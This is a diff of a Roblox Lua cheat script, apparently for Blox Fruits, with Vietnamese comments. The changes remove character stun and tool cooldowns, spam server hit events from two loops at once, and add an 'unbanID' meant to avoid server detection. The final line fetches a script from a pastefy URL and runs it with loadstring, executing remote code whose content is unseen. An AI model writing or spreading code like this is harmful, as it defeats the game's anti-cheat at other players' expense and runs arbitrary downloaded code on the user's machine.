@@ -1,4 +1,4 @@
--- [[ MELEE / SWORD / FRUIT ONLY LOGIC - GLOBAL MAX SPEED ]]
+-- [[ MELEE / SWORD / FRUIT ONLY LOGIC - GOD TIER MAX SPEED ]]
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
@@ -111,18 +111,25 @@ repeat
     end)
 until Net and regHit and regAttack
 
--- [ BYPASS CLICK DELAY TẬN GỐC CHO FRUIT ]
+-- [ BYPASS CLICK DELAY TẬN GỐC & XOÁ TRẠNG THÁI NHÂN VẬT ]
 local oldNM = nil
-local function ExtremeBypass(tool)
+local function ExtremeBypass(tool, char)
     pcall(function()
+        -- 1. Xoá trạng thái khựng của nhân vật (Nguyên nhân chính làm Damage bị khựng 0.5s)
+        if char then
+            local busy = char:FindFirstChild("Busy")
+            local stun = char:FindFirstChild("Stun")
+            if busy then busy.Value = false end
+            if stun then stun.Value = 0 end
+        end
+
+        -- 2. Mở khóa Tool
         if tool:IsA("Tool") then
-            -- Mở khóa toàn bộ thuộc tính giới hạn tốc độ bấm cục bộ của Tool
             tool:SetAttribute("AttackCooldown", 0)
             tool:SetAttribute("LastAttack", 0)
             tool:SetAttribute("State", 0) 
             tool:SetAttribute("Combo", 1)
             
-            -- Gỡ bỏ tận gốc delay nội bộ nếu trái ác quỷ lưu cấu hình bằng biến hoặc cấu trúc cũ
             if tool:FindFirstChild("ClickDelay") then tool.ClickDelay.Value = 0 end
             if tool:FindFirstChild("Cooldown") then tool.Cooldown.Value = 0 end
 
@@ -139,74 +146,73 @@ local function ExtremeBypass(tool)
     end)
 end
 
--- [ GIGA SPEED MELEE / SWORD / FRUIT LOOP ]
-local lastAttackTick = 0
-local ATTACK_DELAY = 0.001 -- Đẩy delay về tiệm cận 0 giống cơ chế script Control
+-- [ GIGA SPEED MELEE / SWORD / FRUIT CORE ]
 local FruitCombo = 1
+local unbanID_base = tostring(LocalPlayer.UserId):sub(2,4)..tostring(coroutine.running()):sub(11,15)
 
-task.spawn(function()
-    while true do
-        RunService.Heartbeat:Wait() 
-        local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
-        local root = char and char:FindFirstChild("HumanoidRootPart")
-        local tool = char and char:FindFirstChildOfClass("Tool")
-        
-        if not regHit or not regAttack or not tool or not root or #AllTargets == 0 then continue end
+-- Đưa logic tấn công vào một hàm riêng để chạy song song
+local function PerformAttack()
+    local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local tool = char and char:FindFirstChildOfClass("Tool")
+    
+    if not regHit or not regAttack or not tool or not root or #AllTargets == 0 then return end
 
-        local toolName = tool.Name:lower()
-        local isGuitar = toolName:find("guitar")
-        local isAnyGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun") or isGuitar
-        local isFruit = (tool.ToolTip == "Blox Fruit")
-        
-        if isAnyGun then continue end
+    local toolName = tool.Name:lower()
+    local isGuitar = toolName:find("guitar")
+    local isAnyGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun") or isGuitar
+    local isFruit = (tool.ToolTip == "Blox Fruit")
+    
+    if isAnyGun then return end
 
-        if tick() - lastAttackTick < ATTACK_DELAY then continue end
-        lastAttackTick = tick()
+    -- Xoá bỏ mọi giới hạn khựng của nhân vật ngay lập tức
+    ExtremeBypass(tool, char)
+    FastAttack() 
 
-        ExtremeBypass(tool)
-        FastAttack() 
-
-        local unbanID_base = tostring(LocalPlayer.UserId):sub(2,4)..tostring(coroutine.running()):sub(11,15)
-
-        local fullHitList = {}
-        for j = 1, math.min(#AllTargets, 10) do
-            local monster = AllTargets[j]
-            if monster and monster.Parent and monster:FindFirstChild("Humanoid") and monster.Humanoid.Health > 0 then
-                local part = monster:FindFirstChild("UpperTorso") or monster:FindFirstChild("Head")
-                if part then table.insert(fullHitList, {monster, part}) end
-            end
-        end
-
-        if #fullHitList > 0 then
-            -- Tăng tiến Combo tự động chạy vòng lặp để đánh lừa Engine hoạt ảnh của game
-            FruitCombo = FruitCombo >= 4 and 1 or FruitCombo + 1
-
-            for i = 1, 3 do 
-                task.spawn(function() 
-                    local unbanID = unbanID_base .. i 
-                    pcall(function()
-                        -- Gây sát thương gốc lên server cực hạn
-                        regHit:FireServer(fullHitList[1][2], fullHitList, nil, nil, unbanID)
-                        
-                        if isFruit then
-                            local leftClick = tool:FindFirstChild("LeftClickRemote", true)
-                            if leftClick then
-                                local lookVector = (fullHitList[1][2].Position - root.Position).Unit
-                                if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
-                                
-                                -- Xả thẳng dữ liệu M1 Fruit liên tục ra Server, tự động kích hoạt Anim/Effect của chính trái đó
-                                leftClick:FireServer(lookVector, FruitCombo, unbanID_base)
-                            end
-                        else
-                            if i == 1 then
-                                regAttack:FireServer(-math.huge)
-                            end
-                        end
-                    end)
-                end)
-            end
+    -- Lọc danh sách mục tiêu
+    local fullHitList = {}
+    for j = 1, math.min(#AllTargets, 10) do
+        local monster = AllTargets[j]
+        if monster and monster.Parent and monster:FindFirstChild("Humanoid") and monster.Humanoid.Health > 0 then
+            local part = monster:FindFirstChild("UpperTorso") or monster:FindFirstChild("Head")
+            if part then table.insert(fullHitList, {monster, part}) end
         end
     end
-end)
+
+    if #fullHitList > 0 then
+        -- Xoay vòng Combo tự nhiên nhất để Server không chặn
+        FruitCombo = FruitCombo >= 4 and 1 or FruitCombo + 1
+
+        -- Chạy đa luồng cực gắt nhưng đồng bộ
+        for i = 1, 3 do 
+            task.spawn(function() 
+                local unbanID = unbanID_base .. i 
+                pcall(function()
+                    -- Gửi Hit thực tế
+                    regHit:FireServer(fullHitList[1][2], fullHitList, nil, nil, unbanID)
+                    
+                    if isFruit then
+                        local leftClick = tool:FindFirstChild("LeftClickRemote", true)
+                        if leftClick then
+                            local lookVector = (fullHitList[1][2].Position - root.Position).Unit
+                            if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
+                            
+                            -- Spam trực tiếp bằng Combo đã đồng bộ
+                            leftClick:FireServer(lookVector, FruitCombo, unbanID_base)
+                        end
+                    else
+                        if i == 1 then
+                            regAttack:FireServer(-math.huge)
+                        end
+                    end
+                end)
+            end)
+        end
+    end
+end
+
+-- DUAL-LOOP: Chạy cùng lúc ở cả 2 Engine Render của game (Nhân đôi tốc độ xả gói tin)
+RunService.Heartbeat:Connect(PerformAttack)
+RunService.Stepped:Connect(PerformAttack)
 
 pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))() end)
